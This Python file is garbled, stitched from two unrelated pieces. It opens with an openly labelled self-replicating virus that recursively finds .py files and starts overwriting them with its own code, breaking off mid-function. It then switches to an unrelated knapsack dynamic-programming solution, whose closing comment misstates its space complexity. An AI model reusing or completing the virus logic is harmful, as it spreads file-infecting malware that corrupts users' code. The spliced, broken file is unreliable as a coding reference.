#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# we can further improve the above Knapsack function's space
# complexity
def knapSack(W, wt, val, n):
 
    K = [[0 for x in range(W+1)] for y in range(2)]
     
    # We know we are always using the  current row or
    # the previous row of the array/vector . Thereby we can
    # improve it further by using a 2D array but with only
    # 2 rows i%2 will be giving the index inside the bounds
    # of 2d array K
    for i in range(n + 1):
        for w in range(W + 1):
            if (i == 0 or w == 0):
                K[i % 2][w] = 0
            elif (wt[i - 1] <= w):
                K[i % 2][w] = max(
                    val[i - 1]
                    + K[(i - 1) % 2][w - wt[i - 1]],
                    K[(i - 1) % 2][w])
 
            else:
                K[i % 2][w] = K[(i - 1) % 2][w]
 
    return K[n % 2][W]
 
# Driver Code
if __name__ == "__main__":
 
    val = [60, 100, 120]
    wt = [10, 20, 30]
    W = 50
    n = len(val)
 
    print(knapSack(W, wt, val, n))
 
    # This code is contributed by ukasp.
# Time Complexity: O(N*W) - where 'N' is the number of weight element and 'W" is capacity. As for every weight element we traverse through all weight capacities 1<=w<=W
# Space Complexity: O(N*W) - As we are using a 2-D array but with only 2 rows